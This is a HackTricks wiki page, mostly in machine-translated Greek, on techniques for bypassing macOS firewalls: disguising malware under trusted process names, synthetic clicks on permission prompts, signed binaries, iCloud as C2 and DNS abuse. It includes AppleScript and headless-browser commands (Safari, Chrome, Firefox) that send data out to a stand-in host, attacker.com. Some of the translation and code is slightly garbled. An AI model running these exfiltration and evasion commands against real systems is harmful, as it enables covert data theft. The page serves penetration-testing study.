# macOS Bypassing Firewalls

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Found techniques

Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές firewall macOS.

### Abusing whitelist names

* Για παράδειγμα, καλώντας το κακόβουλο λογισμικό με ονόματα γνωστών διαδικασιών macOS όπως **`launchd`**

### Synthetic Click

* Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το κακόβουλο λογισμικό να **κλικάρει στο επιτρέπω**

### **Use Apple signed binaries**

* Όπως **`curl`**, αλλά και άλλες όπως **`whois`**

### Well known apple domains

Το firewall θα μπορούσε να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple όπως **`apple.com`** ή **`icloud.com`**. Και το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.

### Generic Bypass

Ορισμένες ιδέες για να προσπαθήσετε να παρακάμψετε τα firewalls

### Check allowed traffic

Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να εντοπίσετε πιθανούς λευκούς τομείς ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτούς.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση DNS

Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα επιτρέπεται να επικοινωνεί με τους διακομιστές DNS.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω εφαρμογών προγράμματος περιήγησης

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Φοίνικας
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Σαφάρι
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω ενέσεων διεργασιών

Αν μπορείτε να **εισάγετε κώδικα σε μια διεργασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, θα μπορούσατε να παρακάμψετε τις προστασίες του τείχους προστασίας:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Αναφορές

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
